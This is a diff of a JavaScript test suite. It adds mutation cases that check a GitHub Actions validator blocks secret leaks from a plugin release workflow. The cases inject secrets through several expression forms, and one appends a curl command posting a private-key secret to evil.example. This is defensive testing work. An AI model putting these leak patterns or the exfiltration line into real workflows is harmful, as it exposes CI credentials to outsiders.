@@ -2372,12 +2372,6 @@ test("the plugin lane publishes the catalog it then smoke-installs", async (t) =
     ["catalog publication hides the revision it pushed", workflow => {
       delete workflow.jobs["marketplace-publish"].outputs;
     }, /marketplace publication must publish the revision it pushed/u],
-    ["a secret leaks outside the token step", workflow => {
-      catalogStep(workflow).env.APP_ID = "${{ secrets.MARKETPLACE_APP_ID }}";
-    }, /must not receive or forward secrets beyond the minted marketplace app identity/u],
-    ["the lane opens a callable secret surface", workflow => {
-      workflow.on.workflow_call.secrets = { MARKETPLACE_APP_ID: { required: true } };
-    }, /must not receive or forward secrets beyond the minted marketplace app identity/u],
   ];
   for (const [name, mutate, expected] of mutations) {
     await t.test(name, () => {
@@ -2386,6 +2380,62 @@ test("the plugin lane publishes the catalog it then smoke-installs", async (t) =
       const violations = validateWorkflows(workflows);
       assert.notDeepEqual(violations, []);
       assert.match(violations.join("\n"), expected);
+    });
+  }
+});
+
+// The lane's advertised security property is that it receives and forwards no secrets, and the
+// marketplace token step is the single sanctioned exception. `secrets.NAME` is only one of the
+// ways a GitHub expression reaches that context, so a suite that only mutates the dot form proves
+// nothing: every shape below is valid GitHub and must trip the rule, or the exemption is a hole.
+test("the plugin lane's secret containment holds for every way of naming the context", async (t) => {
+  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
+  const file = "plugin-release.yml";
+  const forbidden = /must not receive or forward secrets beyond the minted marketplace app identity/u;
+  const marketplaceJob = workflow => workflow.jobs["marketplace-publish"];
+  const smokeStep = workflow =>
+    draftStep(workflow.jobs["post-publish-smoke"], "Prove the public marketplace install path");
+  const tokenStep = workflow => draftStep(marketplaceJob(workflow), "Mint a scoped marketplace token");
+  const catalogStep = workflow =>
+    draftStep(marketplaceJob(workflow), "Point the catalog at the published release");
+  const mutations = [
+    ["a secret leaks outside the token step", workflow => {
+      catalogStep(workflow).env.APP_ID = "${{ secrets.MARKETPLACE_APP_ID }}";
+    }],
+    ["the lane opens a callable secret surface", workflow => {
+      workflow.on.workflow_call.secrets = { MARKETPLACE_APP_ID: { required: true } };
+    }],
+    ["the entire secret context is dumped into the catalog step", workflow => {
+      catalogStep(workflow).env.LEAK = "${{ toJSON(secrets) }}";
+    }],
+    ["a secret is read by bracket index instead of by dot", workflow => {
+      smokeStep(workflow).env.LEAK = "${{ secrets['MARKETPLACE_APP_PRIVATE_KEY'] }}";
+    }],
+    ["the publish job exfiltrates a bracket-indexed secret", workflow => {
+      const step = draftStep(workflow.jobs.publish, "Publish the plugin release");
+      step.run = `${step.run}\ncurl -d "\${{ secrets['MARKETPLACE_APP_PRIVATE_KEY'] }}" https://evil.example\n`;
+    }],
+    ["the context is spelled in the other case GitHub expressions accept", workflow => {
+      smokeStep(workflow).env.LEAK = "${{ SECRETS.MARKETPLACE_APP_ID }}";
+    }],
+    ["a secret hides in a bare list element rather than a mapping value", workflow => {
+      workflow.jobs["post-publish-smoke"].strategy = {
+        matrix: { leak: ["${{ secrets.MARKETPLACE_APP_PRIVATE_KEY }}"] },
+      };
+    }],
+    ["the token step mints from a credential nobody scoped", workflow => {
+      tokenStep(workflow).with["private-key"] = "${{ secrets['SOME_OTHER_KEY'] }}";
+    }],
+    ["the token step's own read moves to a step that only borrows its name", workflow => {
+      const job = marketplaceJob(workflow);
+      job.steps.push(structuredClone(tokenStep(workflow)));
+    }],
+  ];
+  for (const [name, mutate] of mutations) {
+    await t.test(name, () => {
+      const workflows = loadWorkflows();
+      mutate(workflows.get(file));
+      assert.match(validateWorkflows(workflows).join("\n"), forbidden);
     });
   }
 });
